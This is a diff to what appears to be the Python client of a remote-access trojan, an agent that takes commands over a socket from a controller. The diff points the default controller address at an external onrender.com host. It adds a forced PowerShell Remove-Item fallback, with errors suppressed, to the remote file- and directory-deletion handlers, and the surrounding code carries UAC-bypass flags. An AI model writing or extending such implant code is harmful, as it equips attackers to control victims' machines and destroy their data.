@@ -784,13 +784,13 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'http://127.0.0.1:8080',
+        'https://neural-control-hub.onrender.com/',
         'http://localhost:8080'
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'http://127.0.0.1:8080'
+    return 'https://neural-control-hub.onrender.com/'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -15505,15 +15505,34 @@ def on_command(data):
             try:
                 path = command.split(":",1)[1]
                 ok = False
-                if os.path.isfile(path):
-                    os.remove(path)
+                import os as _os
+                if _os.path.isfile(path):
+                    try:
+                        _os.remove(path)
+                    except Exception:
+                        pass
                     ok = True
-                    emit_system_notification('success', 'File Deleted', f'File {os.path.basename(path)} deleted successfully')
-                elif os.path.isdir(path):
+                    emit_system_notification('success', 'File Deleted', f'File {_os.path.basename(path)} deleted successfully')
+                elif _os.path.isdir(path):
                     import shutil
-                    shutil.rmtree(path)
+                    try:
+                        shutil.rmtree(path)
+                    except Exception:
+                        pass
                     ok = True
-                    emit_system_notification('success', 'Directory Deleted', f'Directory {os.path.basename(path)} deleted successfully')
+                    emit_system_notification('success', 'Directory Deleted', f'Directory {_os.path.basename(path)} deleted successfully')
+                if not ok:
+                    try:
+                        import subprocess
+                        ps_exe = _os.path.join(_os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                        ps_path = str(path).replace("'", "''")
+                        ps_cmd = f"Remove-Item -LiteralPath '{ps_path}' -Recurse -Force -ErrorAction SilentlyContinue"
+                        r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=60)
+                        if r.returncode == 0:
+                            ok = True
+                            emit_system_notification('success', 'Deleted via PowerShell', f'Removed {_os.path.basename(path)}')
+                    except Exception:
+                        pass
                 safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
                 output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
             except Exception as e:
@@ -17176,12 +17195,33 @@ class FileSystemManager:
         def handle_delete_file(data):
             path = data.get('path')
             try:
-                if os.path.isfile(path):
-                    os.remove(path)
-                elif os.path.isdir(path):
-                    import shutil
-                    shutil.rmtree(path)
-                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': True})
+                import os as _os
+                ok = False
+                if _os.path.isfile(path):
+                    try:
+                        _os.remove(path)
+                        ok = True
+                    except Exception:
+                        ok = False
+                elif _os.path.isdir(path):
+                    try:
+                        import shutil
+                        shutil.rmtree(path)
+                        ok = True
+                    except Exception:
+                        ok = False
+                if not ok:
+                    try:
+                        import subprocess
+                        ps_exe = _os.path.join(_os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                        ps_path = str(path).replace("'", "''")
+                        ps_cmd = f"Remove-Item -LiteralPath '{ps_path}' -Recurse -Force -ErrorAction SilentlyContinue"
+                        r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=60)
+                        if r.returncode == 0:
+                            ok = True
+                    except Exception:
+                        ok = False
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': ok})
             except Exception as e:
                 safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
         @self.socket.on('rename_file')
